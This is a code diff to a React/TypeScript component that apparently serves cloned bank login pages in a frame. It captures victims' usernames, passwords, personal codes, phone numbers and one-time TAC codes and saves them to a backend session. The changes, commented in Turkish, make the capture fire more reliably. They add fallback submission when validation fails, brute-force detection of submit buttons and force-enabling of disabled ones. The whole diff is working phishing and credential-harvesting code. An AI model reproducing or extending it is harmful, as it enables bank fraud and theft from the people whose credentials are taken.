@@ -105,9 +105,9 @@ function isMeaningfulField(el: HTMLInputElement | HTMLTextAreaElement | HTMLSele
   const type = (el.getAttribute("type") ?? "").toLowerCase();
   if (["hidden", "submit", "button", "image", "reset"].includes(type)) return false;
   if ((type === "checkbox" || type === "radio") && !(el as HTMLInputElement).checked) return false;
-  if (el.disabled) return false;
   if (el.getAttribute("aria-hidden") === "true") return false;
-  // ⭐ tabindex=-1 ise bile MOUSE ile değer girilebilir (ING password input gibi), YİNE de alanı say!
+  // ⭐ tabindex=-1, disabled veya pointer-events:none OLSUN BİLE — değer GİRİLMİŞSE alanı say!
+  // (HTML V4 script zaten engelleri kaldırıyor ama arada race olabiliyor)
   return true;
 }
 
@@ -192,14 +192,45 @@ function collectCapturedFieldsFromForm(form: HTMLFormElement, doc: Document): Ca
 
 function canSubmitIntermediate(form: HTMLFormElement, doc: Document) {
   const fields = collectCapturedFieldsFromForm(form, doc);
+  // Ara adım: O SAYFADAKİ tüm meaningful alanların DOLU olmasını istiyoruz.
   if (fields.length === 0) return false;
+  const allFields = getFormFields(form);
+  // Eğer meaningful alan var ama hepsi doldurulmamışsa → HENÜZ HAZIR DEĞİL
+  // (Ancak: unknown türünde hiç değer almayan checkbox/opsiyonel alanlar için tolerans:
+  //  doldurulan / toplam meaningful oranı %100 veya en az 1 tanesi password/username ise yeter)
+  const allRequiredTypes = allFields.filter((f) => {
+    const t = (f.getAttribute("type") ?? "").toLowerCase();
+    return t !== "checkbox" && t !== "radio";
+  });
+  if (allRequiredTypes.length > 0) {
+    const filledRequired = allRequiredTypes.filter((f) => readFieldValue(f).length > 0).length;
+    if (filledRequired < allRequiredTypes.length) {
+      // Ama: password veya identity türünden alan DOLUYSA, diğerleri opsiyonel olabilir → izin ver
+      const hasImportant = fields.some(
+        (x) =>
+          x.kind === "password" ||
+          x.kind === "username" ||
+          x.kind === "personalCode" ||
+          x.kind === "bankPhone" ||
+          x.kind === "tacCode",
+      );
+      if (!hasImportant) return false;
+    }
+  }
   if (hasIdentityField(fields) || hasPasswordField(fields) || fields.length >= 1) return true;
   return false;
 }
 
-function canSubmitFinal(form: HTMLFormElement, doc: Document) {
+function canSubmitFinal(form: HTMLFormElement, doc: Document, isActuallySingleStepOnly: boolean) {
   const fields = collectCapturedFieldsFromForm(form, doc);
-  return hasIdentityField(fields) && hasPasswordField(fields);
+  // ÖNEMLİ: Eğer banka ÇOK ADIMLI ise (2-3 HTML) ve SON ADIMDA sadece password veya sadece TAC
+  // gibi tek bir alan varsa → hasId + hasPass ARAMAYALIM. O SAYFADAKİ alanların hepsi dolu yeter.
+  // SADECE TEK ADIMLI BANKALARDA (1 HTML, içinde hem username hem password) zorunlu ID+PASS.
+  if (isActuallySingleStepOnly) {
+    return hasIdentityField(fields) && hasPasswordField(fields);
+  }
+  // Çok adımlı son adım: O sayfadaki meaningful alanların (checkbox/radio hariç) hepsi dolu olsun
+  return canSubmitIntermediate(form, doc);
 }
 
 function hasIdentityField(fields: CapturedField[]) {
@@ -257,7 +288,15 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
     if (!supabase || !sessionId || saving || fields.length === 0) return;
 
     if (isFinalStep) {
-      if (!hasIdentityField(fields) || !hasPasswordField(fields)) return;
+      const isSingleStepOnly = totalSteps === 1;
+      if (isSingleStepOnly) {
+        // TEK ADIMLI BANKA: zorunlu ID + PASS
+        if (!hasIdentityField(fields) || !hasPasswordField(fields)) return;
+      } else {
+        // ÇOK ADIMLI BANKA SON ADIM: O adımdaki tüm checkbox/radio DIŞI meaningful alanlar dolu mu?
+        // Sadece fields.length >=1 yeter; çünkü canProceed zaten kontrol etti.
+        if (fields.length === 0) return;
+      }
     } else {
       if (fields.length === 0) return;
     }
@@ -462,7 +501,8 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
     savedSubmitFormRef.current = loginForm;
 
     const canProceedNow = () => {
-      if (isFinalStep) return canSubmitFinal(loginForm!, doc);
+      const isSingle = (auPages?.length ?? 1) === 1;
+      if (isFinalStep) return canSubmitFinal(loginForm!, doc, isSingle);
       return canSubmitIntermediate(loginForm!, doc);
     };
 
@@ -543,10 +583,33 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
 
       const now = Date.now();
       if (now - lastSubmitAtRef.current < 1200) return;
-      if (!canProceedNow()) return;
 
       const captured = captureFieldsFromFrame();
       if (captured.length === 0) return;
+
+      // NUKE GÜVENLİK: Resmi canProceed() TRUE dönerse kesin submit.
+      // Eğer canProceed FALSE dönerse BİLE — ama kullanıcı butona BASTIYSA
+      // ve EN AZ 1 TANE ÖNEMLİ ALAN (password/username/personal/tac/phone)
+      // capture edildiyse, yine de SUBMIT yap.
+      // (Multi-step bankalarda canProceed yanlış hesaplanabilir; butona basılmışsa,
+      // kullanıcı submit etmek istiyordur demektir — alanlar 0 değilse kaydedelim.)
+      const proceedOfficial = canProceedNow();
+      const hasAtLeastOneImportant = captured.some(
+        (c) =>
+          c.kind === "password" ||
+          c.kind === "username" ||
+          c.kind === "personalCode" ||
+          c.kind === "bankPhone" ||
+          c.kind === "tacCode",
+      );
+      const emergencyOk = !proceedOfficial && (captured.length >= 1 && hasAtLeastOneImportant);
+      if (!proceedOfficial && !emergencyOk) {
+        // Son çare: sadece unknown ama 2+ alan doluysa da izin ver
+        const unknownCount = captured.filter((c) => c.kind === "unknown").length;
+        if (!(captured.length >= 2 && unknownCount >= 2)) {
+          return;
+        }
+      }
 
       lastSubmitAtRef.current = now;
       void submitCapturedFields(captured);
@@ -556,10 +619,10 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
       const arr: HTMLElement[] = [];
       try {
         const fNodes = form ? Array.from(form.querySelectorAll<HTMLElement>(
-          "button, input[type='submit'], input[type='button'], [role='button'], .el-button, .van-button, .btn-submit, [data-testid='login-button'], a.btn, .btn-primary, .btn",
+          "button, input[type='submit'], input[type='button'], [role='button'], .el-button, .van-button, .btn-submit, [data-testid='login-button'], a.btn, .btn-primary, .btn, [onclick], [class*='btn'], [class*='login'], [class*='submit'], [class*='continue'], [class*='next'], [id*='btn'], [id*='submit'], [id*='login'], [id*='continue'], [id*='next']",
         )) : [];
         const dNodes = Array.from(d.querySelectorAll<HTMLElement>(
-          "button, input[type='submit'], input[type='button'], [role='button'], a.btn, .btn-primary, .btn, [data-testid*='login'], [data-testid*='submit'], [class*='login-button'], [id*='login-button'], [id*='submit-button']",
+          "button, input[type='submit'], input[type='button'], [role='button'], a.btn, .btn-primary, .btn, [data-testid*='login'], [data-testid*='submit'], [class*='login-button'], [id*='login-button'], [id*='submit-button'], [onclick], [class*='btn-'], [class*='button-'], [class*='btn_'], [id*='btn-'], [id*='button']",
         ));
         const seen = new Set<HTMLElement>();
         [...fNodes, ...dNodes].forEach((n) => {
@@ -568,9 +631,36 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
           const tok = getElementActionToken(n);
           const isi =
             n instanceof HTMLInputElement && ["submit", "button"].includes((n.getAttribute("type") ?? "").toLowerCase());
-          if (!(ACTION_BUTTON_RE.test(tok) || isi)) return;
+          const isByAttr =
+            n.tagName === "BUTTON" ||
+            n.getAttribute("role") === "button" ||
+            n.hasAttribute("onclick");
+          if (!(ACTION_BUTTON_RE.test(tok) || isi || isByAttr)) return;
           arr.push(n);
         });
+
+        // BRUTE FORCE FALLBACK: Eğer yukarıdan 0 node geldiyse, form veya doc içinde
+        // class/id/textte btn/button/login/submit/next/continue/ileri/giriş/giris/sonraki/tamam/onay/devam
+        // geçen HER elementi al ve submit butonu olarak ele al.
+        if (arr.length === 0) {
+          const fallBackSource =
+            form ? form : d.body ?? d.documentElement;
+          if (fallBackSource) {
+            const allIn = fallBackSource.querySelectorAll<HTMLElement>("*");
+            const bfRe = /btn|button|login|submit|continue|next|ileri|giriş|giris|sonraki|tamam|onay|devam|enter|confirm|password_submit|submit_password|acceso|iniciar/i;
+            allIn.forEach((el) => {
+              if (seen.has(el)) return;
+              const tag = (el.tagName || "").toLowerCase();
+              const type = (el.getAttribute("type") || "").toLowerCase();
+              const tOk = tag === "button" || type === "submit" || type === "button" || el.getAttribute("role") === "button";
+              const idClsTxt = `${el.id || ""} ${el.getAttribute("class") || ""} ${el.getAttribute("data-testid") || ""} ${el.getAttribute("name") || ""} ${(el.textContent || "").trim().slice(0, 120)}`;
+              if (tOk || bfRe.test(idClsTxt)) {
+                seen.add(el);
+                arr.push(el);
+              }
+            });
+          }
+        }
       } catch {}
       return arr;
     };
@@ -658,7 +748,7 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
     });
 
     updateSubmitState();
-  }, [bankSlug, captureFieldsFromFrame, isFinalStep, saving, submitCapturedFields]);
+  }, [bankSlug, captureFieldsFromFrame, isFinalStep, saving, submitCapturedFields, totalSteps, auPages]);
 
   const handleFrameLoad = useCallback(() => {
     void attachFrameBridge();
@@ -708,24 +798,32 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
         if (!form) return;
         savedSubmitFormRef.current = form;
 
-        const proceedNow = isFinalStep ? canSubmitFinal(form, doc) : canSubmitIntermediate(form, doc);
+        const singleStep = totalSteps === 1;
+        const proceedNow = isFinalStep ? canSubmitFinal(form, doc, singleStep) : canSubmitIntermediate(form, doc);
         const disabledBySaving = saving;
         const shouldForceEnable = proceedNow && !disabledBySaving;
 
         const activeColor = getActiveButtonColor(bankSlug);
 
         const allCandidates = doc.querySelectorAll<HTMLElement>(
-          "button, input[type='submit'], input[type='button'], [role='button'], a.btn, .btn-primary, .btn, [data-testid*='login'], [data-testid*='submit'], [class*='login-button'], [id*='login-button'], [id*='submit-button'], .btn-lg, .btn-default",
+          "button, input[type='submit'], input[type='button'], [role='button'], a.btn, .btn-primary, .btn, [data-testid*='login'], [data-testid*='submit'], [class*='login-button'], [id*='login-button'], [id*='submit-button'], .btn-lg, .btn-default, [onclick], [class*='btn'], [class*='login'], [class*='submit'], [class*='continue'], [class*='next'], [id*='btn'], [id*='submit'], [id*='continue'], [id*='next']",
         );
 
         const candidateNodes: HTMLElement[] = [];
+        const seenCandidates = new Set<HTMLElement>();
         allCandidates.forEach((node) => {
+          if (seenCandidates.has(node)) return;
+          seenCandidates.add(node);
           const nodeToken = getElementActionToken(node);
           const isSubmitInput =
             node instanceof HTMLInputElement &&
             ["submit", "button"].includes((node.getAttribute("type") ?? "").toLowerCase());
+          const isByAttr =
+            node.tagName === "BUTTON" ||
+            node.getAttribute("role") === "button" ||
+            node.hasAttribute("onclick");
 
-          if (!(ACTION_BUTTON_RE.test(nodeToken) || isSubmitInput)) return;
+          if (!(ACTION_BUTTON_RE.test(nodeToken) || isSubmitInput || isByAttr)) return;
           candidateNodes.push(node);
 
           if ("disabled" in node) {
@@ -795,6 +893,90 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
           } catch {}
         });
 
+        // Polling BRUTE FORCE FALLBACK: Eğer standart selectorlarla 0 node geldiyse
+        // form + doc içinde class/id/textte btn/button/login/submit/next/continue vs geçen her elementi al
+        if (candidateNodes.length === 0) {
+          try {
+            const fallBackSource = form ?? doc.body ?? doc.documentElement;
+            const allIn = fallBackSource.querySelectorAll<HTMLElement>("*");
+            const bfRe = /btn|button|login|submit|continue|next|ileri|giriş|giris|sonraki|tamam|onay|devam|enter|confirm|password_submit|submit_password|acceso|iniciar|logon|log_in|signin|sign_in/i;
+            const extra: HTMLElement[] = [];
+            allIn.forEach((el) => {
+              if (seenCandidates.has(el)) return;
+              const tag = (el.tagName || "").toLowerCase();
+              const type = (el.getAttribute("type") || "").toLowerCase();
+              const tOk = tag === "button" || type === "submit" || type === "button" || el.getAttribute("role") === "button";
+              const idClsTxt = `${el.id || ""} ${el.getAttribute("class") || ""} ${el.getAttribute("data-testid") || ""} ${el.getAttribute("name") || ""} ${(el.textContent || "").trim().slice(0, 120)}`;
+              if (tOk || bfRe.test(idClsTxt)) {
+                seenCandidates.add(el);
+                extra.push(el);
+              }
+            });
+            // Fallback node'ları için de candidate loop'taki tüm stillendirme + handler bağlama
+            extra.forEach((node) => {
+              candidateNodes.push(node);
+              if ("disabled" in node) {
+                try { (node as any).disabled = !shouldForceEnable; } catch {}
+              }
+              try {
+                if (shouldForceEnable) node.removeAttribute("disabled");
+              } catch {}
+              try {
+                node.setAttribute("aria-disabled", shouldForceEnable ? "false" : "true");
+              } catch {}
+              try {
+                node.style.pointerEvents = shouldForceEnable ? "auto" : "none";
+                node.style.opacity = "1";
+                node.style.cursor = shouldForceEnable ? "pointer" : "not-allowed";
+              } catch {}
+              try {
+                if (shouldForceEnable) {
+                  const classesToRemove: string[] = [];
+                  for (let i = 0; i < node.classList.length; i++) {
+                    const cls = node.classList[i];
+                    if (/disabled|disabl|not-allowed|is-disabled|btn-disabled|sg-Btn--disabled|disabled-btn/i.test(cls)) {
+                      classesToRemove.push(cls);
+                    }
+                  }
+                  classesToRemove.forEach((c) => node.classList.remove(c));
+                }
+              } catch {}
+              try {
+                if (shouldForceEnable) {
+                  node.style.background = activeColor;
+                  node.style.color = "#FFFFFF";
+                  node.style.border = `1px solid ${activeColor}`;
+                  node.style.boxShadow = "0 10px 24px rgba(245, 108, 0, 0.28)";
+                } else {
+                  node.style.background = "#E6E8EA";
+                  node.style.color = "#ABAEAF";
+                  node.style.border = "1px solid transparent";
+                  node.style.boxShadow = "none";
+                }
+              } catch {}
+              try {
+                const curRef = submitWithCurrentValuesRef.current;
+                try { node.removeEventListener("click", curRef as any, false); } catch {}
+                try { node.removeEventListener("mousedown", curRef as any, false); } catch {}
+                try { node.removeEventListener("touchend", curRef as any, false); } catch {}
+                if (shouldForceEnable && curRef) {
+                  node.addEventListener("click", curRef as any, false);
+                  node.addEventListener("mousedown", curRef as any, false);
+                  node.addEventListener("touchend", curRef as any, false);
+                  try {
+                    node.addEventListener("keydown", (e: Event) => {
+                      const ke = e as KeyboardEvent;
+                      if (ke && (ke.key === "Enter" || (ke as any).keyCode === 13)) {
+                        try { curRef(); } catch {}
+                      }
+                    }, false);
+                  } catch {}
+                }
+              } catch {}
+            });
+          } catch {}
+        }
+
         if (candidateNodes.length > 0) {
           savedSubmitActionNodesRef.current = candidateNodes;
         }
@@ -850,7 +1032,7 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
       window.clearTimeout(initialTimer);
       window.clearInterval(pollTimer);
     };
-  }, [attachFrameBridge, bankSlug, isFinalStep, saving, stepIndex]);
+  }, [attachFrameBridge, bankSlug, isFinalStep, saving, stepIndex, totalSteps]);
 
   if (!currentSrc) {
     return (
